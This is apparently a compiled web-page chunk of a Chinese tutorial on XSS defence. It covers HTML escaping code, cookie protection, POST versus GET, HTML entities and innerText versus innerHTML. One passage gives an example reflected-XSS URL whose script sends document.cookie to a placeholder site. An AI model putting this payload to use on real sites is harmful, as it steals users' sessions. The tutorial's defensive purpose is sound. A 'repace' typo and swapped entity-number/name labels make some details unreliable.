punctuation"}},[t._v(".")]),t._v("innerHTML "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" \n    text "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" div"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("innerText"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("repace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v("&lt;")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v("&gt;")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('">"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br"),a("span",{staticClass:"line-number"},[t._v("14")]),a("br"),a("span",{staticClass:"line-number"},[t._v("15")]),a("br"),a("span",{staticClass:"line-number"},[t._v("16")]),a("br"),a("span",{staticClass:"line-number"},[t._v("17")]),a("br"),a("span",{staticClass:"line-number"},[t._v("18")]),a("br"),a("span",{staticClass:"line-number"},[t._v("19")]),a("br"),a("span",{staticClass:"line-number"},[t._v("20")]),a("br"),a("span",{staticClass:"line-number"},[t._v("21")]),a("br"),a("span",{staticClass:"line-number"},[t._v("22")]),a("br"),a("span",{staticClass:"line-number"},[t._v("23")]),a("br"),a("span",{staticClass:"line-number"},[t._v("24")]),a("br"),a("span",{staticClass:"line-number"},[t._v("25")]),a("br"),a("span",{staticClass:"line-number"},[t._v("26")]),a("br"),a("span",{staticClass:"line-number"},[t._v("27")]),a("br"),a("span",{staticClass:"line-number"},[t._v("28")]),a("br"),a("span",{staticClass:"line-number"},[t._v("29")]),a("br"),a("span",{staticClass:"line-number"},[t._v("30")]),a("br"),a("span",{staticClass:"line-number"},[t._v("31")]),a("br"),a("span",{staticClass:"line-number"},[t._v("32")]),a("br")])]),a("p",[t._v("写法：")]),t._v(" "),a("div",{staticClass:"language-tsx line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-tsx"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("ESCAPED_CHARS")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("38")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&amp;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("62")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&gt;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("60")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&lt;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("34")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&quot;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("39")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&#x27'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("  \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("UNSAFE_CHARS_REGEX")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v("[&><\"''\"]")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("export")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("escape")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("UNSAFE_CHARS_REGEX")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("match")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=>")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("ESCAPED_CHARS")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("match"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("charCodeAt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br")])])]),t._v(" "),a("li",[a("p",[t._v("如果盗取的 "),a("code",[t._v("cookie")]),t._v(" 信息，可以做一层 "),a("code",[t._v("cookie")]),t._v(" 防盗，避免直接在 "),a("code",[t._v("cookie")]),t._v(" 中泄露用户隐私，例如"),a("code",[t._v("email")]),t._v("、密码等；通过使"),a("code",[t._v("cookie")]),t._v(" 和系统 "),a("code",[t._v("IP")]),t._v(" 绑定来降低 "),a("code",[t._v("cookie")]),t._v(" 泄露后的危险。")])]),t._v(" "),a("li",[a("p",[t._v("控制请求头：")]),t._v(" "),a("blockquote",[a("p",[t._v("对用户向服务器提交的信息进行检查，设置预期提交格式。")])]),t._v(" "),a("p",[t._v("在请求时，编写一个 "),a("code",[t._v("header()")]),t._v("，用于控制 "),a("code",[t._v("json")]),t._v(" 数据的头部，如"),a("code",[t._v('header("Content-type:application/json")）')])])]),t._v(" "),a("li",[a("p",[t._v("尽量采用 "),a("code",[t._v("POST")]),t._v(" 而非 "),a("code",[t._v("GET")]),t._v(" 作为请求方法。")]),t._v(" "),a("p",[t._v("主要为了避免反射型 "),a("code",[t._v("XSS")]),t._v(" 攻击，有情况是网页的内容就是来源于 "),a("code",[t._v("URL")]),t._v(" ，如若此时设计一个超链接地址："),a("code",[t._v("http://www.xxx.com?content=<script>window.open(“www.bbb.com?param=”+document.cookie)<\/script>")]),t._v(" 。当加载页面时，"),a("code",[t._v("content")]),t._v(" 的内容会由后端触发，用户的 "),a("code",[t._v("cookie")]),t._v(" 会被发送给 "),a("code",[t._v("bbb")]),t._v(" 网站。")])])]),t._v(" "),a("h2",{attrs:{id:"_4-扩展-什么是-html-实体"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-扩展-什么是-html-实体"}},[t._v("#")]),t._v(" 4.扩展：什么是 "),a("code",[t._v("HTML")]),t._v(" 实体？")]),t._v(" "),a("blockquote",[a("p",[t._v("详细内容，请参见参考博文2。")])]),t._v(" "),a("p",[t._v("在 "),a("code",[t._v("HTML")]),t._v(" 中"),a("code",[t._v("<")]),t._v("，"),a("code",[t._v(">")]),t._v("，"),a("code",[t._v("&")]),t._v("等有特殊含义（"),a("code",[t._v("<")]),t._v("，"),a("code",[t._v(">")]),t._v("，用于链接签，"),a("code",[t._v("&")]),t._v(" 用于转义），不能直接使用。")]),t._v(" "),a("p",[t._v("因此在"),a("code",[t._v("HTML")]),t._v(" 中标识一些特殊字符时，可以使用"),a("strong",[t._v("转义字符串")]),t._v(" （"),a("code",[t._v("Escape Sequence")]),t._v("），或称为字符实体（"),a("code",[t._v("Character Entity")]),t._v("），有以下原因：")]),t._v(" "),a("ol",[a("li",[t._v("在 "),a("code",[t._v("HTML")]),t._v(" 中使用。")]),t._v(" "),a("li",[t._v("有些字符在 "),a("code",[t._v("ASCII")]),t._v(" 字符集中没有定义，需要使用转义字符串标识。")])]),t._v(" "),a("p",[t._v("转义字符串有两种标识方式：")]),t._v(" "),a("ol",[a("li",[a("code",[t._v("&")]),t._v(" + "),a("code",[t._v("#")]),t._v(" + 实体（"),a("code",[t._v("Entity")]),t._v("） 编号 + "),a("code",[t._v(";")]),t._v(" ，举例："),a("code",[t._v("<")]),t._v(" 会被转义为"),a("code",[t._v("&lt;")])]),t._v(" "),a("li",[a("code",[t._v("&")]),t._v(" + "),a("code",[t._v("#")]),t._v(" + 实体（"),a("code",[t._v("Entity")]),t._v("） 名称 + "),a("code",[t._v(";")]),t._v(" ，举例："),a("code",[t._v("<")]),t._v(" 会被转义为 "),a("code",[t._v("&#60;")])])]),t._v(" "),a("blockquote",[a("p",[t._v("实用网址：http://tool.c7sky.com/htmlescape/")])]),t._v(" "),a("h2",{attrs:{id:"_5-扩展-innertext-与-innerhtml-的区别"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-扩展-innertext-与-innerhtml-的区别"}},[t._v("#")]),t._v(" 5.扩展："),a("code",[t._v("innerText")]),t._v(" 与 "),a("code",[t._v("innerHTML")]),t._v(" 的区别？")]),t._v(" "),a("p",[t._v("在前文中，先 "),a("code",[t._v("innerText")]),t._v(" 再 "),a("code",[t._v("innerHTML")]),t._v(" 进行 "),a("code",[t._v("HTML")]),t._v(" 文本的编码操作，通过先 "),a("code",[t._v("innerHTML")]),t._v(" 再 "),a("code",[t._v("innerText")]),t._v(" 进行 "),a("code",[t._v("HTML")]),t._v(" 文本的解码操作。接下来分析下这个行为：")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("编码：")]),t._v(" "),a("ul",[a("li",[a("p",[a("code",[t._v('div.innerText = "<div>123</div>"')]),t._v(" 告诉浏览器，此部分内容为文本内容。\n浏览器器为了将 "),a("code",[t._v("<div>123</div>")]),t._v(" 渲染在页面中，就必须对其中的特殊字符（"),a("code",[t._v("<")]),t._v(" | "),a("code",[t._v(">")]),t._v(" ） 进行转义。")])]),t._v(" "),a("li",[a("p",[t._v("通过 "),a("code",[t._v("div.innerHTML")]),t._v(" 就可以将转义后的文本取出，如："),a("code",[t._v("&lt;div&gt;123&lt;/div&gt;")])]),t._v(" "),a("img",{staticStyle:{zoom:"40%"},attrs:{src:"https://wjs-tik.oss-cn-shanghai.aliyuncs.com/202301081642138.png",alt:"image-20230108164221833"}}),t._v(" "),a("img",{staticStyle:{zoom:"50%"},attrs:{src:"https://wjs-tik.oss-cn-shanghai.aliyuncs.com/202301081640692.png",alt:""}})])])]),t._v(" "),a("li",[a("p",[t._v("解码：")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("当调用"),a("code",[t._v("div.innerHTML")]),t._v(" 时，")]),t._v(" "),a("ul",[a("li",[t._v("当传入的是带"),a("code",[t._v("HTML")]),t._v(" 标签的文本时 "),a("code",[t._v("<span>123<span>")]),t._v(" ，则在页面只会渲染 "),a("code",[t._v("123")]),t._v(" 。")]),t._v(" "),a("li",[t._v("而但当传入的内容本身就是编码后的字符时 "),a("code",[t._v("&lt;div&gt;123&lt;/div&gt;")]),t._v(" ，则会渲染 "),a("code",[t._v("<div>123</div>")])])])]),t._v(" "),a("li",[a("p",[t._v("此时调用 "),a("code",[t._v("div.innerText")]),t._v(" 则可以获取此部分内容。")]),t._v(" "),a("img",{staticStyle:{zoom:"50%"},attrs:{src:"https://wjs-tik.oss-cn-shanghai.aliyuncs.com/202301081639917.png"}})])])])]),t._v(" "),a("h2",{attrs:{id:"参考博文"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考博文"}},[t._v("#")]),t._v(" 参考博文：")]),t._v(" "),a("ol",[a("li",[a("p",[a("a",{attrs:{href:"https://blog.csdn.net/qq_26599807/article/details/127790481",target:"_blank",rel:"noopener noreferrer"}},[t._v("XSS攻击及防御（简单易懂）"),a("OutboundLink")],1)])]),t._v(" "),a("li",[a("p",[a("a",{attrs:{href:"https://www.cnblogs.com/lizihong/p/4322727.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("HTML字符实体（Character Entities），转义字符串（Escape Sequence）"),a("OutboundLink")],1)])])])])}),[],!1,null,null,null);s.default=e.exports}}]);